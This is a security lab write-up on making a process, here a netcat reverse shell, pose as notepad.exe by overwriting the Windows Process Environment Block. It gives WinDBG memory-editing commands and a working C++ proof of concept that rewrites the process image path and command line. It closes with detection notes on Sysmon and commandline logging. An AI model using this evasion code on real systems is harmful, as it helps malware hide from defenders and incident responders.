---
description: >-
  Understanding how malicious binaries can maquerade as any other legitimate
  Windows binary from the userland.
---

# Masquerading Processes in Userland via \_PEB

## Masquerading Processes in Userland via \_PEB

### Overview

In this short lab I am going to use a WinDBG to make my malicious program pretend to look like a notepad.exe (hence masquerading) when inspecting system's running processes with tools like Sysinternals ProcExplorer and similar. Note that this is not a [code injection](../code-and-process-injection/) exercise.

This is possible, because information about the process, i.e commandline arguments, image location, loaded modules, etc is stored in a memory structure called Process Environment Block (`_PEB`) that is accessible and writeable from the userland.

{% hint style="info" %}
Thanks to [@FuzzySec](https://twitter.com/FuzzySec) who pointed out the following:\
\&#xNAN;_you don't need SeDebugPrivilege when overwriting the PEB for your own process or generally for overwriting a process spawned in your user context_

[_https://twitter.com/FuzzySec/status/1090963518558482436_](https://twitter.com/FuzzySec/status/1090963518558482436)
{% endhint %}

This lab builds on the previous lab:

{% content-ref url="../../reversing-forensics-and-misc/internals/exploring-process-environment-block.md" %}
[exploring-process-environment-block.md](../../reversing-forensics-and-misc/internals/exploring-process-environment-block.md)
{% endcontent-ref %}

### Context

For this demo, my malicious binary is going to be an `nc.exe` - a rudimentary netcat reverse shell spawned by cmd.exe and the PID of `4620`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPVgPITj9FiVX7IixKO%2F-LPVhGC7anCPfkQEwMxr%2Fmalicious-process.PNG?alt=media\&token=869b829f-37bc-4929-852a-6a8c75fa0a1e)

Using WinDBG, we will make the nc.exe look like notepad.exe. This will be reflected in the `Path` field and the binary icon in the process properties view using ProcExplorer as seen in the below graphic. Note that it is the same nc.exe process (PID 4620) as shown above, only this time masquerading as a notepad.exe:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPSW35tOQ7shDOUe8TD%2F-LPSUNUGv5mIniog3kL1%2Fmasquerade-5.png?alt=media\&token=9ccd1f67-71ab-4231-85d5-b6bf57a98898)

### Execution

So how is this possible? Read on.

Let's first have a look at the \_PEB structure for the `nc.exe` process using WinDBG:

```csharp
dt _peb @$peb
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPSW35tOQ7shDOUe8TD%2F-LPSUNUQSYcJjGyOEv8l%2Fmasquerade-13.png?alt=media\&token=9b907451-6068-4bcd-b53b-ce4feed0b9d4)

Note that at the offset `0x020` of the PEB, there is another structure which is of interest to us - `_RTL_USER_PROCESS_PARAMETERS`, which contains nc.exe process information. Let's inspect it further:

```csharp
dt _RTL_USER_PROCESS_PARAMETERS 0x00000000`005e1f60
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPSW35tOQ7shDOUe8TD%2F-LPSUNUO-ziq7dxBM7lA%2Fmasquerade-12.png?alt=media\&token=03e5d9bc-4392-46c7-89d9-9512198e0c0e)

The offset `0x060` of `_RTL_USER_PROCESS_PARAMETERS` is also of interest to us - it contains a member `ImagePathName` which points to a structure `_UNICODE_STRING` that, as we will see later, contains a field `Buffer` which effectively signifies the name/full path to our malicious binary nc.exe. Note how at the offset `0x70` we can see the commandline arguments of the malicious process, which we explored [previously](../../reversing-forensics-and-misc/internals/exploring-process-environment-block.md).

Let's inspect the aforementioned `_UNICODE_STRING` structure:

```csharp
dt _UNICODE_STRING 0x00000000`005e1f60+60
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPSW35tOQ7shDOUe8TD%2F-LPSUNUMcLn8eDDZtsTw%2Fmasquerade-10.png?alt=media\&token=ee448e3c-d84e-4227-a2e3-b04939bf2ea2)

`_UNICODE_STRING` structure describes the lenght of the string and also points to the actual memory location ``0x00000000`005e280e`` by the `Buffer` field that contains the string which is a full path to our malicious binary.

Let's confirm the string location by dumping the bytes at ``0x00000000`005e280e`` by issuing the following command in WinDBG:

```csharp
0:002> du 0x00000000`005e280e
00000000`005e280e  "C:\tools\nc.exe"
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPSW35tOQ7shDOUe8TD%2F-LPSUNULfmZ7aDfdXl6v%2Fmasquerade-9.png?alt=media\&token=6db3d364-4a50-43df-9e6d-16ade8eb156e)

Now that I have confirmed that ``0x00000000`005e280e`` indeed contains the path to the binary, let's try to write a new string to that memory address. Say, let's try swapping the nc.exe with a path to the notepad.exe binary found in Windows\System32\notepad.exe:

```csharp
eu 0x00000000`005e280e "C:\\Windows\\System32\\notepad.exe"
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPSW35tOQ7shDOUe8TD%2F-LPSUNU6vlUdAAE4vp_6%2Fmasquerade-1.png?alt=media\&token=ba503563-f346-4f05-b92d-76e061b549c2)

{% hint style="warning" %}
If you are following along, do not forget to add NULL byte at the end of your new string to terminate it:

```
eb 0x00000000`005e280e+3d 0x0
```
{% endhint %}

Let's check the `_UNICODE_STRING` structure again to see if the changes took effect:

```csharp
dt _UNICODE_STRING 0x00000000`005e1f60+60
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPSW35tOQ7shDOUe8TD%2F-LPSUNUEoENgmVdX1EcX%2Fmasquerade-4.png?alt=media\&token=58f40d5a-c78f-443e-af2e-40b07942fb06)

We can see that our string is getting truncated. This is because the `Lenght` value in the `_UNICODE_STRING` structure is set to 0x1e (30 decimal) which equals to only 15 unicode characters:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPSW35tOQ7shDOUe8TD%2F-LPSUNUC-wNXJ3u9SJkv%2Fmasquerade-3.png?alt=media\&token=8f534c6c-a2d1-461d-b823-ee9f48074204)

Let's increase that value to 0x3e to accomodate our longer string pointing to notepad.exe binary and check the structure again:

```csharp
eb 0x00000000`005e1f60+60 3e
dt _UNICODE_STRING 0x00000000`005e1f60+60
```

Good, the string pointed to by the field `Buffer` is no longer getting truncated:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPSW35tOQ7shDOUe8TD%2F-LPSUNUBhi5lFPdgGQ4g%2Fmasquerade-2.png?alt=media\&token=f97d2caa-7acb-43b6-ac79-aa781e3da8cc)

For the sake of this demo, I cleared out the commandline arguments the nc.exe was launched with by amending the `_UNICODE_STRING` structure member `Lenght` by setting it to 0:

```csharp
eb 0x00000000`005e1f60+70 0x0
```

Inspecting our malicious nc.exe process again using Process Explorer reveals that it now looks like notepad without commandline arguments:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPSW35tOQ7shDOUe8TD%2F-LPSVzL-bdiB4rrcDmHY%2Fmasquerade-14.png?alt=media\&token=1bb2c040-a151-4258-9406-fe3b59264a08)

Note that to further obfuscate the malicious binary, one could also rename the binary itself from nc.exe to notepad.exe.

### A simple PoC

As part of this simple lab, I wanted to write a simple C++ proof of concept that would make the running program masquerade itself as a notepad. Here is the code:

{% code title="pebmasquerade.cpp" %}
```cpp
#include "stdafx.h"
#include "Windows.h"
#include "winternl.h"

typedef NTSTATUS(*MYPROC) (HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

int main()
{
	HANDLE h = GetCurrentProcess();
	PROCESS_BASIC_INFORMATION ProcessInformation;
	ULONG lenght = 0;
	HINSTANCE ntdll;
	MYPROC GetProcessInformation;
	wchar_t commandline[] = L"C:\\windows\\system32\\notepad.exe";
	ntdll = LoadLibrary(TEXT("Ntdll.dll"));

	//resolve address of NtQueryInformationProcess in ntdll.dll
	GetProcessInformation = (MYPROC)GetProcAddress(ntdll, "NtQueryInformationProcess");

	//get _PEB object
	(GetProcessInformation)(h, ProcessBasicInformation, &ProcessInformation, sizeof(ProcessInformation), &lenght);

	//replace commandline and imagepathname
	ProcessInformation.PebBaseAddress->ProcessParameters->CommandLine.Buffer = commandline;
	ProcessInformation.PebBaseAddress->ProcessParameters->ImagePathName.Buffer = commandline;

	return 0;
}
```
{% endcode %}

..and here is the compiled running program being inspected with ProcExplorer - we can see that the masquerading is achieved successfully:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPY0UNsWLW1fxiqhXDq%2F-LPY3mLnfDasrH3-zBge%2FScreenshot%20from%202018-10-23%2023-36-52.png?alt=media\&token=6a741817-0905-4f46-8720-9cd9c18fcae7)

### Observations

Switching back to the nc.exe masquerading as notepad.exe, if we check the `!peb` data, we can see a notepad.exe is now displayed in the `Ldr.InMemoryOrderModuleList` memory structure!

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPX6fxVk8o32GW4dhPt%2F-LPXFONM9P-noIWZFQJU%2FScreenshot%20from%202018-10-23%2019-47-59.png?alt=media\&token=5da38535-c128-4b7b-a6db-5d4e0879d349)

[![Logo](https://www.ired.team/~gitbook/image?url=https%3A%2F%2Flearn.microsoft.com%2Ffavicon.ico\&width=20\&dpr=4\&quality=100\&sign=d8acf9f\&sv=2)NtQueryInformationProcess function (winternl.h) - Win32 appsMicrosoftLearn](https://docs.microsoft.com/en-us/windows/desktop/api/winternl/nf-winternl-ntqueryinformationprocess#return-value)

Note that even though it shows in the loaded modules that notepad.exe was loaded, it still does not mean that there was an actual notepad.exe process created and sysmon logs prove this, meaning commandline logging can still be helpful in detecting this behaviour.

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPXHkASou9Kiwmg9mZM%2F-LPXIpCoyZsZsZJU6315%2FScreenshot%20from%202018-10-23%2020-02-49.png?alt=media\&token=3ad38be6-a689-4588-8cd3-7a972afef3c3)

### Credits

[@b33f](https://twitter.com/FuzzySec) for his [Masquerade-PEB.ps1](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Masquerade-PEB.ps1) which is what originally inspired me (quite some time ago now) to explore this concept, but I never got to lay my hands on it until now.\
[\
@Mumbai](https://twitter.com/@ilove2pwn_) for talking to me about C++ and NtQueryInformationProcess

### References

{% embed url="https://x.com/FuzzySec/status/775541332513259520/photo/1" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/winternl/nf-winternl-ntqueryinformationprocess" %}
